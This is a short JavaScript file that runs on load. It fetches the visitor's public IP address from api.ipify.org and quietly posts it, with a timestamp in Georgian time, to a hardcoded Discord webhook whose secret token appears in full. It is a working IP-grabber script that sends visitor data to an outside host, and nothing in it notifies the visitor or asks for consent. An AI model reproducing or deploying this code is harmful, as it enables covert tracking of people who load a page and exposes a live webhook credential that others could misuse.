const ipifyAPI = "https://api.ipify.org?format=json";
const webhookURL =
  "https://discord.com/api/webhooks/1367683410989940756/cx2uFFLodvi3paS-hUHxv9waFC4LG2FEqRGLs0bO8nV3CQ-qvPnp8NYbsmiMkMHRteA5";

function getGeorgianTime() {
  const now = new Date();
  const georgianOffset = 4; // UTC+4
  const georgianTime = new Date(
    now.getTime() + georgianOffset * 60 * 60 * 1000
  );
  return georgianTime
    .toISOString()
    .replace("T", " ")
    .replace("Z", " (Georgian Time)");
}

async function getIP() {
  try {
    const response = await fetch(ipifyAPI);
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.error("Error fetching IP:", error);
    return null;
  }
}

async function sendToDiscord(ip) {
  if (!ip) {
    console.error("IP address is null or undefined.");
    return;
  }

  // Add Georgian time to the payload
  const timestamp = getGeorgianTime();

  const payload = {
    content: `IP Address: ${ip}\nTimestamp: ${timestamp}`,
  };

  try {
    const response = await fetch(webhookURL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(payload),
    });

    if (response.ok) {
      console.log("IP sent to Discord successfully!");
    } else {
      console.error("Error sending IP to Discord:", response.statusText);
    }
  } catch (error) {
    console.error("Error:", error);
  }
}

async function main() {
  const ip = await getIP();
  if (ip) {
    await sendToDiscord(ip);
  }
}

main();
